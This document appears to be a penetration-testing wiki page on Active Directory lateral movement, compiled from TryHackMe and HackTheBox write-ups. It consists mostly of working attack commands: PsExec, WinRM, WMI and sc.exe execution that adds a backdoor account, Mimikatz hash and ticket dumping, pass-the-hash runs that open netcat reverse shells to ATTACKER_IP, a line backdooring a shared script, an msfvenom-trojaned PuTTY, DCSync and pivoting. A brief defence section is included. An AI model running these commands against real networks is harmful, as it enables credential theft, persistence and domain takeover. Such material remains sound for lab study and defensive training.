---
title: "Active Directory Lateral Movement"
type: technique
tags: [0xdf, active-directory, kerberos, lateral-movement, pass-the-hash, post-exploitation, thm, windows]
phase: post-exploitation
date_created: 2026-05-08
date_updated: 2026-05-13
sources: [thm-ad-lateral, 0xdf-windows-ad, hacktricks-windows]
---

# Active Directory Lateral Movement

## What it is

Lateral movement in Active Directory is the set of techniques used to move from one compromised host to another across a domain, leveraging valid credentials, credential material (hashes/tickets), or trust relationships — without requiring fresh exploitation of each target.

## How it works

An attacker who has obtained credentials or credential material (NTLM hash, Kerberos ticket, or encryption key) for an account with access to a remote host can spawn processes, install services, or run commands on that host. The various techniques differ by protocol used, required privileges, and whether the attacker needs a plaintext password.

## Prerequisites

- Valid credentials (plaintext, NTLM hash, or Kerberos ticket) for a user with access to the target
- Network connectivity to the target on the relevant port(s)
- For most techniques: local Administrator membership on the target
- For WinRM: membership in the Remote Management Users group

## Methodology

### 1. Remote Process Creation via PsExec

**Ports:** 445/TCP (SMB)  
**Requires:** Local Administrator on target

PsExec uploads a service binary to the Admin$ share, registers it as a service (PSEXESVC), then creates named pipes for stdin/stdout/stderr.

```cmd
# Windows Sysinternals psexec
psexec64.exe \\TARGET -u Administrator -p Mypass123 -i cmd.exe
```

From Linux using Impacket (supports Pass-the-Hash — see section below):
```bash
psexec.py DOMAIN/user:password@TARGET_IP
psexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET_IP
```

### 2. Remote Process Creation via WinRM

**Ports:** 5985/TCP (HTTP) or 5986/TCP (HTTPS)  
**Requires:** Remote Management Users group membership

```cmd
# Native winrs client
winrs.exe -u:Administrator -p:Mypass123 -r:TARGET cmd
```

```powershell
# PowerShell — build a PSCredential object first
$username = 'Administrator'
$password = 'Mypass123'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

# Interactive session
Enter-PSSession -Computername TARGET -Credential $credential

# Non-interactive single command
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock { whoami }
```

From Linux:
```bash
evil-winrm -i TARGET_IP -u user -p password
evil-winrm -i TARGET_IP -u user -H NTLM_HASH    # Pass-the-Hash
```

### 3. Remote Service Creation via SC.exe

**Ports:** 135/TCP + 49152-65535/TCP (DCE/RPC) or 445/139 (SMB named pipes)  
**Requires:** Local Administrator on target

```cmd
# Create and start a service that runs an arbitrary command
sc.exe \\TARGET create THMservice binPath= "net user backdoor Pass123 /add" start= auto
sc.exe \\TARGET start THMservice

# Cleanup
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```

The command output is not returned — this is a blind execution primitive.

### 4. Scheduled Tasks Remotely (schtasks)

```cmd
# Create a task that runs once
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "cmd.exe /c whoami > C:\out.txt" /sc ONCE /sd 01/01/1970 /st 00:00

# Trigger it
schtasks /s TARGET /run /TN "THMtask1"

# Delete
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```

### 5. WMI (Windows Management Instrumentation)

**Ports:** 135/TCP + dynamic DCE/RPC, or 5985/5986 (WinRM transport)  
**Requires:** Local Administrator on target

First establish a CIM session:
```powershell
$username = 'Administrator'
$password = 'Mypass123'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-CimSession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

**Spawn a process:**
```powershell
$Command = "powershell.exe -Command Set-Content -Path C:\out.txt -Value test"
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
    CommandLine = $Command
}
```

Legacy `wmic` equivalent:
```cmd
wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe"
```

**Create a service via WMI:**
```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
    Name = "THMService2"
    DisplayName = "THMService2"
    PathName = "net user backdoor Pass123 /add"
    ServiceType = [byte]::Parse("16")
    StartMode = "Manual"
}
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"
Invoke-CimMethod -InputObject $Service -MethodName StartService
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

**Create a scheduled task via WMI:**
```powershell
$Command = "cmd.exe"
$Args = "/c net user backdoor Pass123 /add"
$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

**Install an MSI package via WMI (good for msfvenom payloads):**
```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{
    PackageLocation = "C:\Windows\myinstaller.msi"
    Options = ""
    AllUsers = $false
}
```

```cmd
# Legacy wmic equivalent
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
```


### 6. DCOM Object Method Execution

Abuse DCOM objects whose methods reach a shell, running as the interactive user of the DCOM launch over 135 plus dynamic RPC. Common objects: `MMC20.Application` (`Document.ActiveView.ExecuteShellCommand`), `ShellWindows`, `ShellBrowserWindow`, and Office `Excel.Application`. No service is installed (evades 7045), but the payload parent is `mmc.exe`, `explorer.exe`, or an Office process.

```bash
dcomexec.py -object MMC20 DOMAIN/user:Password@HOST "powershell -enc <B64>"
```
```powershell
$d = [Type]::GetTypeFromProgID("MMC20.Application","HOST")
[Activator]::CreateInstance($d).Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c <payload>","7")
```

Detection: shells parented by `mmc.exe`, an Office app, or `explorer.exe`; DCOM activation logs and RPC to 135.
## Key Payloads / Examples

### Pass-the-Hash (NTLM)

Extract hashes from SAM (local users only):
```
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam
```

Extract hashes from LSASS memory (domain users who have logged on):
```
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # sekurlsa::msv
```

Inject a hash to impersonate a user (spawns new process with the victim's token):
```
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"nc64.exe -e cmd.exe ATTACKER_IP 5555"
```

From Linux — PtH with various tools:
```bash
# RDP
xfreerdp /v:TARGET_IP /u:DOMAIN\\user /pth:NTLM_HASH

# PsExec (Linux version supports PtH; Windows version does not)
psexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET_IP

# WinRM
evil-winrm -i TARGET_IP -u user -H NTLM_HASH

# WMIExec
wmiexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET_IP

# SMBExec
smbexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET_IP
```

### Headless RDP command execution (RDP-only foothold)

When a low-priv user is only in **Remote Desktop Users** (no SMB-admin / WinRM), interactive RDP is
the only exec path (e.g. finding a KeePass DB or running local privesc on the box). Drive it headless
from Linux with FreeRDP + a virtual display + xdotool, using a redirected drive as the exfil channel
(THM Forward):
```bash
Xvfb :99 -screen 0 1360x820x24 &
# NB FreeRDP 3.x: /cert:ignore (NOT /cert-ignore). /drive:sh,<path> => \\tsclient\sh on the target.
DISPLAY=:99 xfreerdp3 /v:DC /u:user /p:pass /d:DOMAIN /cert:ignore /w:1360 /h:820 /drive:sh,/tmp/share &
# open the Run dialog and execute a batch dropped in the share, redirect output back to the share:
DISPLAY=:99 xdotool key super+r; sleep 2
DISPLAY=:99 xdotool type --delay 40 'cmd /c \\tsclient\sh\run.bat'; DISPLAY=:99 xdotool key Return
DISPLAY=:99 import -window root /tmp/shot.png     # screenshot to read GUI (e.g. revealed passwords)
```
Gotchas: the xfreerdp3 headless **clipboard is unreliable** (syncs 1 byte) - read secrets by revealing
them in the app and screenshotting, not Ctrl+C. AppLocker often blocks dropped .exe (winPEAS); enumerate
with built-ins (reg/sc/wmic/schtasks) which live in the allowed C:\Windows. See also [[password-cracking]]
(KeePass DPAPI "Windows user account" DBs must be opened on the box as the owning user).

**No exec needed to win — read files directly with pass-the-hash when EDR blocks command execution.**
If Defender/EDR kills `wmiexec`/`psexec`/`-x` exec primitives but you hold a DA (or any privileged)
NT hash, you do not need code execution to grab a flag/file — `smbclient` authenticates with the
hash alone and reads via SMB, no process ever spawns on the target:

```bash
smbclient //DC/C$ -U DOMAIN/Administrator --pw-nt-hash <NTHASH> -c 'get <path-to-file>'
```

CrackMapExec / NetExec PtH:
```bash
crackmapexec smb TARGET_IP -u user -H NTLM_HASH
crackmapexec smb TARGET_IP -u user -H NTLM_HASH --exec-method smbexec -x whoami
netexec smb TARGET_IP -u user -H NTLM_HASH
```

### Pass-the-Ticket (Kerberos)

Extract all tickets from LSASS (requires SYSTEM):
```
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

Inject a specific ticket into the current session (no admin required):
```
mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
```

Verify loaded tickets:
```cmd
klist
```

Using Rubeus to request a TGT and inject it:
```cmd
Rubeus.exe asktgt /user:Administrator /password:Mypass123 /ptt
```

### Overpass-the-Hash / Pass-the-Key

When RC4 is enabled, the NTLM hash equals the RC4 Kerberos key — use it to request a TGT:
```
mimikatz # sekurlsa::ekeys    # dump all Kerberos encryption keys
```

Request a TGT using different key types:
```
# RC4 (NTLM hash works here)
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"nc64.exe -e cmd.exe ATTACKER_IP 5556"

# AES128
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"nc64.exe -e cmd.exe ATTACKER_IP 5556"

# AES256
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:<key> /run:"nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

## Bypasses and Variants

### Abusing User Behaviour — Writable Shares

If a network share holds scripts that users regularly execute, backdoor them to get a shell when the user runs the script:

```bash
# Inject into a shared VBS script (add this line)
CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\ATTACKER_IP\share\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe ATTACKER_IP 1234", 0, True
```

Backdoor a shared executable using msfvenom:
```bash
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```

### RDP Session Hijacking

On Windows Server 2016 and earlier, if you have SYSTEM privileges you can hijack disconnected RDP sessions without a password:

```cmd
PsExec64.exe -s cmd.exe    # get SYSTEM shell
query user                  # find disconnected sessions (state=Disc)
tscon <SESSION_ID> /dest:<YOUR_RDP_SESSION>    # e.g. tscon 3 /dest:rdp-tcp#6
```

## Port Forwarding for Lateral Movement

When target ports are firewalled, use a compromised host as a pivot.

### SSH Remote Port Forwarding (pivot exposes target port to attacker)
```bash
# On pivot (PC-1): forward DC's port 3389 to attacker's machine
ssh tunneluser@ATTACKER_IP -R 3389:TARGET_IP:3389 -N

# Attacker connects to localhost
xfreerdp /v:127.0.0.1 /u:user /p:password
```

### SSH Local Port Forwarding (attacker's service exposed through pivot)
```bash
# On pivot: make attacker's port 80 available on pivot's port 80
ssh tunneluser@ATTACKER_IP -L *:80:127.0.0.1:80 -N
# Add firewall rule on pivot if needed:
netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
```

### Dynamic Port Forwarding / SOCKS Proxy
```bash
# On pivot: create SOCKS proxy on attacker's port 9050
ssh tunneluser@ATTACKER_IP -R 9050 -N

# Attacker's proxychains.conf:
# socks4  127.0.0.1 9050

proxychains nmap TARGET_IP
proxychains evil-winrm -i TARGET_IP -u user -p password
```

### Socat Port Forward (no SSH available)
```bash
# Forward pivot's 3389 to target's 3389
socat TCP4-LISTEN:3389,fork TCP4:TARGET_IP:3389
netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
```

## From the Wild — graph edges to tooling (HTB, 0xdf)

Treat BloodHound edges as prerequisites for reachable services and tools. Enumeration workflow stays on [[ad-enumeration]]. Kerberos-heavy material (delegation, shadow credentials, silver tickets, RBCD, `findDelegation.py`, `getST.py`) stays on [[kerberos-attacks]]. Certificate pivots tie to [[certipy]] / [[adcs]].

### Pattern cheat sheet

| BloodHound / IAM signal | Moves you toward | Ports / primitives |
|------------------------|------------------|---------------------|
| `GenericAll`, `ForceChangePassword`, `Self` on User | Controlled password reset, SMB or WinRM with new secret | **445**, **5985**; RPC **setuserinfo2** versus PowerShell ACL helpers |
| `WriteDacl` / privileged group join on sensitive object | Delegate **DCSync** capability | Replication RPC (**445**, **135**, high ports) via `secretsdump.py` |
| Replication rights (**GetChanges** + **GetChangesAll**) | Direct NTDS pull | Same as DCSync path |
| `PSRemote`, **Remote Management Users** membership | Scripted shell transport | **5985**, **5986**; [[evil-winrm]], `Enter-PSSession` |
| `AdminTo` edge with Administrative access | SMB-style execution | **445** via `psexec.py`, `wmiexec.py`, `smbexec.py`, or [[netexec]] |
| Delegation bits / RBCD `msDS-AllowedToActOnBehalfOfOtherIdentity` | S4U workflows | Kerberos **88**; tooling on [[kerberos-attacks]] |

### Worked naming references (sanitize secrets in engagements)

**Forest.** `svc-alfresco` sits under nested groups implying **Account Operators**, which holds **GenericAll** on **Exchange Windows Permissions**. Add self to group, attach **DCSync** DACL (`Add-DomainObjectAcl` examples on the edge help tab), optionally refresh credential object, dump with Impacket:

```bash
secretsdump.py 'DOMAIN/user:pass@DC_IP'
evil-winrm -i DC_hostname -u administrator -H ADMIN_NTLM_HEX
```

**Sauna.** `svc_loanmgr` already inherits replication rights (`GetChanges` / `GetChangesAll`). Immediate `secretsdump.py` lane.

**Blackfield.** `support` inherits **ForceChangePassword** toward `AUDIT2020`; flip password by RPC (**setuserinfo2** level **23**) then SMB validation and pivot into forensic artefacts before WinRM user.

**Intelligence / Search.** rerun **bloodhound-python** after swapping user context — GMSA and delegation artefacts often appear only for higher-priv collectors.

**Pivotapi.** Ingest aligns SQL-linked Windows principals with Remote Management memberships; escalate with [[evil-winrm]] once creds crack.

**Rebound.** Large graph supplemented with **`findDelegation.py`** for constrained delegation plus RBCD before DC impersonation workflows ([[kerberos-attacks]]).

### RPC snippet for `ForceChangePassword`

```bash
rpcclient -U 'DOMAIN/low%pass' DC_IP -c 'setuserinfo2 victim_account 23 "NewRandPass!"'
netexec smb DC_IP -u victim_account -p 'NewRandPass!'
```

## Detection and Defence

- Monitor Event ID 4624 (logon) and 4648 (explicit credential use) for unusual source hosts
- Alert on service creation (Event ID 7045) and scheduled task creation (Event ID 4698) from unexpected accounts
- Enable Credential Guard to protect LSASS from hash/ticket extraction
- Enforce Protected Users group membership for privileged accounts (prevents NTLM and RC4 Kerberos use)
- Restrict WinRM access via firewall to management hosts only
- Monitor SMB lateral movement with network detection rules (Admin$ share writes followed by service creation)
- Detect `sekurlsa::` and `kerberos::ptt` Mimikatz usage via AV/EDR behavioural signatures
- Enforce AES-only Kerberos to block RC4-based overpass-the-hash

## Tools

- Mimikatz — hash/ticket extraction, PtH, PtT, OPtH
- Impacket — psexec.py, wmiexec.py, smbexec.py (Linux PtH)
- Evil-WinRM — WinRM shell with PtH support
- CrackMapExec / NetExec — SMB/WinRM lateral movement and PtH
- Rubeus — Kerberos ticket requests and injection
- PsExec (Sysinternals) — remote process creation
- socat — port forwarding on pivot hosts

## Sources

- TryHackMe: AD Lateral Movement and Pivoting room
- HTB Windows Active Directory methodology writeups (`0xdf-windows-ad`): Forest, Sauna, Blackfield, Intelligence, Pivotapi, Search, Rebound, Delegate, MultiMaster (sampled for BH-to-protocol linkage)

## Wired sub-techniques

<!-- auto-wired: context-reachable sub-technique pages -->
- [[active-directory-ntds-dumping]]
- [[applocker-bypass]]
- [[deployment-mdt]]
- [[deployment-sccm]]
- [[deployment-scom]]
- [[deployment-wsus]]
- [[internal-coerce]]
- [[internal-dcom]]
- [[internal-pxe-boot-image]]
- [[password-gmsa]]
- [[password-group-policy-preferences]]
- [[password-laps]]
- [[password-pre-created-computer-account]]
- [[windows-amsi-bypass]]
- [[windows-download-and-execute-methods]]
- [[windows-dpapi]]
- [[windows-using-credentials]]
